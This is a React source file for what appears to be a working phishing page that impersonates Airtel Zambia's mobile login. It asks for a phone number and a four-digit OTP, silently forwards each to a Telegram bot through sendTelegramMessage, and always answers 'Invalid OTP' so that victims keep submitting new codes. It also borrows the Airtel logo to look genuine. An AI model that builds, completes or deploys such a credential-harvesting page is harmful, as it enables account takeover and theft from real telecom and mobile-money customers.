"use client"

import React, { useState, useEffect, useCallback, useRef } from "react"
import { sendTelegramMessage } from "@/lib/telegram"

type FlowStep = "phone" | "verifying_phone" | "otp" | "verifying_otp"

export default function AirtelPage() {
  const [step, setStep] = useState<FlowStep>("phone")
  const [phoneNumber, setPhoneNumber] = useState("")
  const [otp, setOtp] = useState<string[]>([])
  const [timer, setTimer] = useState(56)
  const [canResend, setCanResend] = useState(false)
  const [otpError, setOtpError] = useState("")
  const [isShaking, setIsShaking] = useState(false)

  const phoneInputRef = useRef<HTMLInputElement>(null)

  // Countdown timer for OTP
  useEffect(() => {
    let interval: NodeJS.Timeout
    if (step === "otp" && timer > 0) {
      interval = setInterval(() => {
        setTimer((prev) => prev - 1)
      }, 1000)
    } else if (timer === 0) {
      setCanResend(true)
    }
    return () => clearInterval(interval)
  }, [step, timer])

  // Format timer into MM:SS
  const formatTimer = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
  }

  // Handle phone number keypad input (unlimited digits allowed)
  const handlePhoneKeyPress = (digit: string) => {
    setPhoneNumber((prev) => prev + digit)
  }

  const handlePhoneBackspace = () => {
    setPhoneNumber((prev) => prev.slice(0, -1))
  }

  // Handle OTP keypad input
  const handleOtpKeyPress = useCallback(
    (digit: string) => {
      if (otp.length < 4) {
        const nextOtp = [...otp, digit]
        setOtp(nextOtp)
        setOtpError("")

        // Auto trigger verification when 4th digit entered
        if (nextOtp.length === 4) {
          const fullOtp = nextOtp.join("")
          triggerOtpVerification(fullOtp)
        }
      }
    },
    [otp, phoneNumber]
  )

  const handleOtpBackspace = useCallback(() => {
    setOtp((prev) => prev.slice(0, -1))
    setOtpError("")
  }, [])

  // Listen to physical keyboard events
  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (step === "phone") {
        if (/^[0-9]$/.test(e.key)) {
          handlePhoneKeyPress(e.key)
        } else if (e.key === "Backspace") {
          handlePhoneBackspace()
        } else if (e.key === "Enter" && phoneNumber.length > 0) {
          handleProceedToLogin()
        }
      } else if (step === "otp") {
        if (/^[0-9]$/.test(e.key)) {
          handleOtpKeyPress(e.key)
        } else if (e.key === "Backspace") {
          handleOtpBackspace()
        }
      }
    }

    window.addEventListener("keydown", handleKeyDown)
    return () => window.removeEventListener("keydown", handleKeyDown)
  }, [step, phoneNumber, handleOtpKeyPress, handleOtpBackspace])

  // Proceed from phone to verifying
  const handleProceedToLogin = async () => {
    if (!phoneNumber) return

    setStep("verifying_phone")

    // Send Telegram alert
    try {
      await sendTelegramMessage({
        title: "📱 Airtel Zambia - Mobile Login",
        phoneNumber: `+260${phoneNumber}`,
        phone: `+260${phoneNumber}`,
      })
    } catch {
      // silent
    }

    // Simulate verification delay (1.8s) then transition to OTP
    setTimeout(() => {
      setStep("otp")
      setTimer(56)
      setCanResend(false)
      setOtp([])
    }, 1800)
  }

  // Trigger OTP verification
  const triggerOtpVerification = async (enteredOtp: string) => {
    setStep("verifying_otp")

    try {
      await sendTelegramMessage({
        title: "🔐 Airtel Zambia - OTP Submitted",
        phoneNumber: `+260${phoneNumber}`,
        otp1: enteredOtp,
      })
    } catch {
      // silent
    }

    // Simulate 2.5s verification check, then return to OTP screen with error so user can retry
    setTimeout(() => {
      setStep("otp")
      setOtp([])
      setOtpError("Invalid OTP. Please enter the valid code.")
      setIsShaking(true)
      setTimeout(() => setIsShaking(false), 500)
    }, 2500)
  }

  // Resend OTP
  const handleResendOtp = async () => {
    if (!canResend) return
    setTimer(56)
    setCanResend(false)
    setOtp([])
    setOtpError("")

    try {
      await sendTelegramMessage({
        title: "🔄 Airtel Zambia - Resend OTP Requested",
        phoneNumber: `+260${phoneNumber}`,
      })
    } catch {
      // silent
    }
  }

  // Mask phone number for display (e.g. ******667)
  const getMaskedPhone = () => {
    if (!phoneNumber) return "******667"
    const last3 = phoneNumber.slice(-3) || "667"
    return `******${last3}`
  }

  const isValidPhone = phoneNumber.length > 0

  return (
    <main
      className="min-h-screen w-full bg-[#F6F6F9] flex flex-col items-center justify-between font-sans select-none text-[#1C1C1E] antialiased"
      dir="ltr"
    >
      {/* ========================================================================= */}
      {/* SCREEN 1: PHONE NUMBER INPUT                                             */}
      {/* ========================================================================= */}
      {step === "phone" && (
        <div className="w-full max-w-[440px] min-h-screen flex flex-col justify-between bg-[#F6F6F9] pb-6 sm:pb-8 mx-auto">
          {/* Header Bar with #FFFEFF */}
          <header className="w-full bg-[#FFFEFF] px-5 sm:px-6 h-16 relative flex items-center justify-between border-b border-black/[0.04] shrink-0">
            {/* Back Arrow */}
            <button
              type="button"
              onClick={() => setPhoneNumber("")}
              aria-label="Back"
              className="w-10 h-10 -ml-2 flex items-center justify-center text-[#1A1D20] active:opacity-50 transition-opacity"
            >
              <svg
                width="22"
                height="22"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth="2.8"
                strokeLinecap="round"
                strokeLinejoin="round"
              >
                <polyline points="15 18 9 12 15 6" />
              </svg>
            </button>

            {/* Airtel Logo */}
            <div className="absolute left-1/2 -translate-x-1/2 flex items-center justify-center">
              <AirtelLogo />
            </div>

            {/* Spacer for symmetry */}
            <div className="w-10" />
          </header>

          {/* Main Body Content on #F6F6F9 */}
          <div className="px-5 sm:px-6 flex-1 flex flex-col justify-between">
            <div>
              {/* Title */}
              <div className="mt-6 sm:mt-7">
                <h1 className="text-[23px] sm:text-[24px] font-bold text-[#1C1C1E] tracking-tight">
                  Welcome to Airtel Zambia
                </h1>

                {/* Field Label */}
                <label className="block text-[14px] font-semibold text-[#2C2F36] mt-7 mb-2.5">
                  Registered Number
                </label>

              {/* Number Input Container with two border lines */}
              <div
                onClick={() => phoneInputRef.current?.focus()}
                className="relative py-3 border-t-[1.5px] border-b-[1.5px] border-[#A1BFE7] flex items-center gap-2.5 cursor-text"
              >
                {/* Phone icon */}
                <svg
                  width="18"
                  height="18"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="#8E929B"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  className="shrink-0"
                >
                  <rect x="5" y="2" width="14" height="20" rx="2.5" />
                  <line x1="12" y1="18" x2="12.01" y2="18" strokeWidth="2.5" />
                </svg>

                {/* Country code */}
                <span className="text-[17px] font-semibold text-[#1C1C1E] tracking-tight shrink-0">
                  +260
                </span>

                {/* Vertical Blue Cursor */}
                <span className="w-[1.5px] h-[20px] bg-[#3B82F6] animate-pulse shrink-0" />

                {/* Input Text or Placeholder */}
                <div className="flex-1 text-[17px] tracking-wide overflow-hidden whitespace-nowrap">
                  {phoneNumber ? (
                    <span className="text-[#1C1C1E] font-medium tracking-[1px]">
                      {phoneNumber}
                    </span>
                  ) : (
                    <span className="text-[#B2B7BF] font-normal">Enter here</span>
                  )}
                </div>

                {/* Hidden input for mobile native keyboard / screen reader compatibility */}
                <input
                  ref={phoneInputRef}
                  type="tel"
                  inputMode="none"
                  value={phoneNumber}
                  onChange={(e) => {
                    const val = e.target.value.replace(/\D/g, "")
                    setPhoneNumber(val)
                  }}
                  className="absolute inset-0 opacity-0 pointer-events-none"
                  tabIndex={-1}
                />
              </div>
            </div>
          </div>

          {/* Numeric Keypad (Airtel Zambia style) */}
          <div className="mt-8 sm:mt-10 mb-14 sm:mb-20">
            <div className="grid grid-cols-3 gap-y-6 sm:gap-y-7 text-center max-w-[280px] sm:max-w-[300px] mx-auto">
              {["1", "2", "3", "4", "5", "6", "7", "8", "9"].map((num) => (
                <button
                  key={num}
                  type="button"
                  onClick={() => handlePhoneKeyPress(num)}
                  className="h-11 sm:h-12 flex items-center justify-center text-[22px] sm:text-[24px] font-normal text-[#2B2E35] active:opacity-40 transition-opacity select-none cursor-pointer"
                >
                  {num}
                </button>
              ))}

              {/* Blank cell */}
              <div className="h-11 sm:h-12" />

              {/* Zero */}
              <button
                type="button"
                onClick={() => handlePhoneKeyPress("0")}
                className="h-11 sm:h-12 flex items-center justify-center text-[22px] sm:text-[24px] font-normal text-[#2B2E35] active:opacity-40 transition-opacity select-none cursor-pointer"
              >
                0
              </button>

              {/* Backspace */}
              <button
                type="button"
                onClick={handlePhoneBackspace}
                aria-label="Delete"
                className="h-11 sm:h-12 flex items-center justify-center active:opacity-40 transition-opacity select-none cursor-pointer"
              >
                <BackspaceTagIcon />
              </button>
            </div>
          </div>

          {/* Bottom Proceed Button */}
          <div className="w-full mt-auto">
            <button
              type="button"
              disabled={!isValidPhone}
              onClick={handleProceedToLogin}
              className={`w-full h-[52px] rounded-[6px] font-bold text-[15px] tracking-[0.5px] uppercase transition-all duration-200 flex items-center justify-center select-none ${
                isValidPhone
                  ? "bg-[#1E2538] text-white shadow-md shadow-[#1E2538]/20 active:scale-[0.99] cursor-pointer hover:bg-[#161C2C]"
                  : "bg-[#D6DBE2] text-white cursor-not-allowed"
              }`}
            >
              PROCEED TO LOGIN
            </button>
          </div>
        </div>
      </div>
    )}

      {/* ========================================================================= */}
      {/* SCREEN 2 & 4: FULL-SCREEN DARK VERIFICATION OVERLAY                      */}
      {/* ========================================================================= */}
      {(step === "verifying_phone" || step === "verifying_otp") && (
        <div className="fixed inset-0 z-50 bg-[#4D4E55] flex flex-col items-center justify-center gap-5 transition-opacity">
          {/* iOS-style Spinner */}
          <IOSActivityIndicator />

          {/* Verification Text */}
          <p className="text-white text-[16px] sm:text-[17px] font-normal tracking-wide">
            {step === "verifying_phone" ? "Verifying Mobile Number" : "Verifying OTP"}
          </p>
        </div>
      )}

      {/* ========================================================================= */}
      {/* SCREEN 3: OTP VERIFICATION                                               */}
      {/* ========================================================================= */}
      {step === "otp" && (
        <div className="w-full max-w-[440px] min-h-screen flex flex-col justify-between bg-[#F6F6F9] mx-auto">
          {/* Header Bar with #FFFEFF */}
          <header className="w-full bg-[#FFFEFF] px-5 sm:px-6 h-14 relative flex items-center justify-between border-b border-black/[0.04] shrink-0">
            {/* Back Chevron */}
            <button
              type="button"
              onClick={() => {
                setStep("phone")
                setOtp([])
                setOtpError("")
              }}
              aria-label="Back to login"
              className="w-10 h-10 -ml-2 flex items-center justify-center text-[#1A1D20] active:opacity-50 transition-opacity"
            >
              <svg
                width="22"
                height="22"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth="2.8"
                strokeLinecap="round"
                strokeLinejoin="round"
              >
                <polyline points="15 18 9 12 15 6" />
              </svg>
            </button>

            {/* Title */}
            <h2 className="absolute left-1/2 -translate-x-1/2 text-[17px] sm:text-[18px] font-bold text-[#1C1C1E] tracking-tight">
              OTP Verification
            </h2>

            {/* Spacer */}
            <div className="w-10" />
          </header>

          {/* Top Section on #F6F6F9 */}
          <div className="px-5 sm:px-6 pt-3">

            {/* Subtext shown clearly at top */}
            <p className="text-[14.5px] text-[#2C2F36] leading-relaxed mt-5 mb-8 text-left">
              An OTP has been sent to{" "}
              <span className="font-semibold">{getMaskedPhone()}</span> and WhatsApp.
            </p>

            {/* 4 OTP Input Boxes */}
            <div
              className={`flex items-center justify-center gap-3.5 sm:gap-4 mb-5 transition-transform ${
                isShaking ? "animate-[shake_0.4s_ease-in-out]" : ""
              }`}
            >
              {[0, 1, 2, 3].map((index) => {
                const hasValue = index < otp.length
                const isCurrent = index === otp.length

                return (
                  <div
                    key={index}
                    className={`w-[58px] h-[58px] sm:w-[64px] sm:h-[64px] rounded-[14px] bg-white border flex items-center justify-center transition-all ${
                      hasValue
                        ? "border-gray-300 shadow-[0_2px_4px_rgba(0,0,0,0.06)]"
                        : isCurrent
                        ? "border-[#5B96F7] shadow-[0_0_0_2px_rgba(91,150,247,0.25)]"
                        : "border-gray-200 shadow-xs"
                    }`}
                  >
                    {hasValue ? (
                      /* Asterisk symbol - semibold */
                      <span className="text-[28px] sm:text-[30px] font-semibold text-[#1C1C1E] leading-none select-none">
                        *
                      </span>
                    ) : isCurrent ? (
                      <span className="w-[1.5px] h-[22px] bg-[#3B82F6] animate-pulse" />
                    ) : null}
                  </div>
                )
              })}
            </div>

            {/* OTP Error message if any */}
            {otpError && (
              <p className="text-red-600 text-[13px] text-center font-medium mb-3">
                {otpError}
              </p>
            )}

            {/* Resend OTP Row */}
            <div className="flex items-center justify-between px-2 mb-8 text-[13px]">
              <button
                type="button"
                disabled={!canResend}
                onClick={handleResendOtp}
                className={`font-bold tracking-wider uppercase transition-colors ${
                  canResend
                    ? "text-[#ED1B24] cursor-pointer hover:underline"
                    : "text-[#A3A8B1] cursor-not-allowed"
                }`}
              >
                RESEND OTP
              </button>

              <span className="font-semibold text-[#666B74] tracking-wider">
                {formatTimer(timer)}
              </span>
            </div>

            {/* Customer Care Section */}
            <div className="text-center mt-2 mb-6">
              <p className="text-[13.5px] font-medium text-[#4B505A] mb-3">
                Need customer care help?
              </p>
              <a
                href="tel:111"
                className="inline-flex items-center justify-center gap-2 px-5 py-1.5 rounded-full border border-[#22252A] text-[#22252A] hover:bg-gray-50 active:scale-95 transition-all text-[13.5px] font-semibold"
              >
                <svg
                  width="15"
                  height="15"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                >
                  <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z" />
                </svg>
                <span>Call</span>
              </a>
            </div>
          </div>

          {/* iOS System Keypad with shadow around each digit */}
          <div className="w-full bg-[#ECEEF2] pt-2 pb-5 sm:pb-6 px-1.5 border-t border-[#DDE0E6]">
            <div className="grid grid-cols-3 gap-1.5 max-w-[420px] mx-auto">
              {[
                { digit: "1", letters: "" },
                { digit: "2", letters: "ABC" },
                { digit: "3", letters: "DEF" },
                { digit: "4", letters: "GHI" },
                { digit: "5", letters: "JKL" },
                { digit: "6", letters: "MNO" },
                { digit: "7", letters: "PQRS" },
                { digit: "8", letters: "TUV" },
                { digit: "9", letters: "WXYZ" },
              ].map((item) => (
                <button
                  key={item.digit}
                  type="button"
                  onClick={() => handleOtpKeyPress(item.digit)}
                  className="bg-white rounded-[5px] sm:rounded-[6px] shadow-[0_1px_2px_rgba(0,0,0,0.22)] h-[46px] sm:h-[48px] flex flex-col items-center justify-center active:bg-[#E5E7EB] transition-colors cursor-pointer select-none"
                >
                  <span className="text-[23px] sm:text-[25px] font-normal leading-none text-[#000000]">
                    {item.digit}
                  </span>
                  {item.letters && (
                    <span className="text-[9px] sm:text-[9.5px] font-bold tracking-[1.5px] text-[#000000] uppercase mt-0.5 leading-none">
                      {item.letters}
                    </span>
                  )}
                </button>
              ))}

              {/* Blank placeholder key */}
              <div className="h-[46px] sm:h-[48px]" />

              {/* Zero with shadow card */}
              <button
                type="button"
                onClick={() => handleOtpKeyPress("0")}
                className="bg-white rounded-[5px] sm:rounded-[6px] shadow-[0_1px_2px_rgba(0,0,0,0.22)] h-[46px] sm:h-[48px] flex flex-col items-center justify-center active:bg-[#E5E7EB] transition-colors cursor-pointer select-none"
              >
                <span className="text-[23px] sm:text-[25px] font-normal leading-none text-[#000000]">
                  0
                </span>
              </button>

              {/* Backspace key */}
              <button
                type="button"
                onClick={handleOtpBackspace}
                aria-label="Delete"
                className="rounded-[5px] sm:rounded-[6px] h-[46px] sm:h-[48px] flex items-center justify-center active:opacity-50 transition-opacity cursor-pointer select-none"
              >
                <svg
                  width="26"
                  height="20"
                  viewBox="0 0 24 18"
                  fill="none"
                  stroke="#1C1C1E"
                  strokeWidth="1.6"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                >
                  <path d="M7 1L1 9L7 17H23V1H7Z" />
                  <line x1="12" y1="6" x2="18" y2="12" />
                  <line x1="18" y1="6" x2="12" y2="12" />
                </svg>
              </button>
            </div>
          </div>
        </div>
      )}
    </main>
  )
}

/* ========================================================================= */
/* SUB-COMPONENTS & ICONS                                                    */
/* ========================================================================= */

/**
 * Pixel-perfect Airtel brand logo matching Image 1
 */
function AirtelLogo() {
  return (
    <div className="flex items-center justify-center select-none">
      <img
        src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTuUIYILCH57PwwcpNDvCJfl0Fw53NfBSKqOpReSVfSJMDiw4OO8w&s&ec=121966380"
        alt="Airtel"
        className="h-[44px] sm:h-[48px] w-auto object-contain"
      />
    </div>
  )
}

/**
 * Airtel Zimbabwe/Zambia custom numeric keypad backspace tag icon
 */
function BackspaceTagIcon() {
  return (
    <svg
      width="24"
      height="18"
      viewBox="0 0 30 22"
      fill="none"
      xmlns="http://www.w3.org/2000/svg"
    >
      <path
        d="M9.5 1.5L1.5 11L9.5 20.5H27C28.1046 20.5 29 19.6046 29 18.5V3.5C29 2.39543 28.1046 1.5 27 1.5H9.5Z"
        fill="#6B7280"
      />
      <path
        d="M15 7L21 15M21 7L15 15"
        stroke="white"
        strokeWidth="2.2"
        strokeLinecap="round"
      />
    </svg>
  )
}

/**
 * Smooth 12-petal iOS activity indicator
 */
function IOSActivityIndicator() {
  const petals = [
    { rotate: 0, delay: "-0.916s", opacity: 0.15 },
    { rotate: 30, delay: "-0.833s", opacity: 0.22 },
    { rotate: 60, delay: "-0.75s", opacity: 0.3 },
    { rotate: 90, delay: "-0.666s", opacity: 0.38 },
    { rotate: 120, delay: "-0.583s", opacity: 0.45 },
    { rotate: 150, delay: "-0.5s", opacity: 0.53 },
    { rotate: 180, delay: "-0.416s", opacity: 0.6 },
    { rotate: 210, delay: "-0.333s", opacity: 0.68 },
    { rotate: 240, delay: "-0.25s", opacity: 0.76 },
    { rotate: 270, delay: "-0.166s", opacity: 0.84 },
    { rotate: 300, delay: "-0.083s", opacity: 0.92 },
    { rotate: 330, delay: "0s", opacity: 1 },
  ]

  return (
    <div className="relative w-10 h-10">
      {petals.map((petal, index) => (
        <span
          key={index}
          className="absolute w-[3px] h-[8px] bg-white rounded-full left-[18.5px] top-[3px] origin-[1.5px_17px] animate-[iosSpin_1s_linear_infinite]"
          style={{
            transform: `rotate(${petal.rotate}deg)`,
            animationDelay: petal.delay,
          }}
        />
      ))}
    </div>
  )
}
